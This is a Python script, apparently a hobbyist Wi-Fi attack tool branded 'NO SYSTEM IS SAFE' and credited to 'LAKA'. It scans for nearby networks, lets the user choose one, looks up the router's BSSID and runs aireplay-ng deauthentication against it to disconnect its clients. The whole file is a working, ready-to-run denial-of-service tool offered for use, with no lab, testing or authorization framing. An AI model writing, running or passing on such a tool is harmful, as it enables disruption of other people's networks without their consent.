import subprocess
import time
import sys
import pyfiglet

BLUE = '\033[94m'
RESET = '\033[0m'

def scan_wifi():
    print(f"{BLUE}Scanning for Wi-Fi networks...{RESET}")
    networks = []
    
    try:
        result = subprocess.check_output(["sudo", "iwlist", "wlan0", "scan"])
        result = result.decode('utf-8')
        
        lines = result.split('\n')
        for line in lines:
            if "ESSID" in line:
                ssid = line.split(':')[1].strip().strip('"')
                networks.append(ssid)
        return networks
    except subprocess.CalledProcessError as e:
        print(f"{BLUE}Error scanning Wi-Fi networks: {e}{RESET}")
        return []

def attack_router(target_bssid, interface="wlan0"):
    print(f"{BLUE}Attacking router {target_bssid} to disconnect it...{RESET}")
    try:
        
        subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", target_bssid, interface], check=True)
        print(f"{BLUE}Attack complete. Router disconnected.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{BLUE}Error attacking router: {e}{RESET}")

def get_router_bssid(ssid):
    try:
        result = subprocess.check_output(["sudo", "iwlist", "wlan0", "scan"])
        result = result.decode('utf-8')
        
        lines = result.split('\n')
        bssid = None
        for line in lines:
            if f'ESSID:"{ssid}"' in line:
               
                bssid = lines[lines.index(line) - 2].split()[1]
                break
        return bssid
    except subprocess.CalledProcessError as e:
        print(f"{BLUE}Error retrieving BSSID for {ssid}: {e}{RESET}")
        return None

def animated_welcome_message():
    message = "NO SYSTEM IS SAFE"
    tool_creator = "Tool created by LAKA."
    
    ascii_art = pyfiglet.figlet_format(message)
    
    for char in ascii_art:
        sys.stdout.write(f"{BLUE}{char}{RESET}")
        sys.stdout.flush()
        time.sleep(0.05)  
    
    time.sleep(0.5)  

    print()  
    for char in tool_creator:
        sys.stdout.write(f"{BLUE}{char}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)  
    
    print()  

def main():
    animated_welcome_message()
    
    networks = scan_wifi()
    
    if not networks:
        print(f"{BLUE}No networks found. Exiting...{RESET}")
        return
    
    print(f"{BLUE}Available Wi-Fi networks:{RESET}")
    for idx, ssid in enumerate(networks, start=1):
        print(f"{BLUE}{idx}. {ssid}{RESET}")
    
    try:
        choice = int(input(f"{BLUE}Select the router to attack (1-{len(networks)}):{RESET} "))
        if choice < 1 or choice > len(networks):
            print(f"{BLUE}Invalid selection. Exiting...{RESET}")
            return
        
        selected_ssid = networks[choice - 1]
        print(f"{BLUE}You selected: {selected_ssid}{RESET}")
        
        target_bssid = get_router_bssid(selected_ssid)
        if not target_bssid:
            print(f"{BLUE}Could not retrieve BSSID for {selected_ssid}. Exiting...{RESET}")
            return
        
        attack_router(target_bssid)
    
    except ValueError:
        print(f"{BLUE}Invalid input. Exiting...{RESET}")

if __name__ == "__main__":
    main()
